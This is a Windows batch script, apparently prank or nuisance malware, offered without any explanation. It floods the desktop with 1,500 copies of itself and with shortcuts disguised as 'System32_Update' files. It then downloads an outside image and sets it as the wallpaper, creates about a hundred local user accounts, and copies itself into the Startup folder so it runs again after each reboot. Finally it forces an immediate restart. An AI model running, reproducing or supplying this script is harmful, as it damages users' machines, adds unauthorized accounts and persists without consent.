@echo off

set "TARGET_DESKTOP=%USERPROFILE%\Desktop"
set "BAT_NAME=%~nx0"
set "LNK_NAME=System32_Update_%RANDOM%.lnk"
set "VBS_REP=%TEMP%\rep.vbs"
set "CLNP_COUNT=0"


(
echo Set oWS = WScript.CreateObject("WScript.Shell"^)
echo sLinkFile = "%TARGET_DESKTOP%\%LNK_NAME%"
echo Set oLink = oWS.CreateShortcut(sLinkFile^)
echo oLink.TargetPath = "%~f0"
echo oLink.IconLocation = "shell32.dll,3"
echo oLink.WorkingDirectory = "%~dp0"
echo oLink.Save
) > "%VBS_REP%"


:REPLICATE
if %CLNP_COUNT% GEQ 1500 goto :WALLPAPER
cscript //nologo "%VBS_REP%" >nul
set /a CLNP_COUNT+=1
copy "%~f0" "%TARGET_DESKTOP%\CLNP_%RANDOM%.bat" >nul
goto REPLICATE


:WALLPAPER
set "JPG_URL=https://i.pinimg.com/736x/49/d2/0f/49d20fc81d7bc08e983106aa0bf769a9.jpg"
set "JPG_PATH=%TEMP%\larping_clnp.jpg"
set "WALLPAPER_REG=HKCU\Control Panel\Desktop"


powershell -Command "Invoke-WebRequest -Uri '%JPG_URL%' -OutFile '%JPG_PATH%' -UseBasicParsing" >nul 2>&1


reg add "%WALLPAPER_REG%" /v Wallpaper /t REG_SZ /d "%JPG_PATH%" /f >nul
reg add "%WALLPAPER_REG%" /v WallpaperStyle /t REG_SZ /d 2 /f >nul
reg add "%WALLPAPER_REG%" /v TileWallpaper /t REG_SZ /d 0 /f >nul


RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul


:ACCOUNT_SPAM
set "USER_LARP=???????_%RANDOM%"
set "USER_CLNP=????_%RANDOM%"


net user "%USER_LARP%" /add >nul 2>&1
net user "%USER_CLNP%" /add >nul 2>&1


net localgroup Users "%USER_LARP%" /add >nul 2>&1
net localgroup Users "%USER_CLNP%" /add >nul 2>&1


set /a AC+=1
if %AC% LEQ 100 goto ACCOUNT_SPAM


set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "MAPS_LNK=%STARTUP%\Google_Maps.lnk"


powershell -Command ^
"$ws = New-Object -ComObject WScript.Shell; ^
$lnk = $ws.CreateShortcut('%MAPS_LNK%'); ^
$lnk.TargetPath = 'https://www.google.com/maps'; ^
$lnk.IconLocation = 'C:\Program Files\Google\Chrome\Application\chrome.exe,0'; ^
$lnk.Save()" >nul 2>&1


copy "%~f0" "%STARTUP%\%BAT_NAME%" >nul


shutdown /r /f /t 0


exit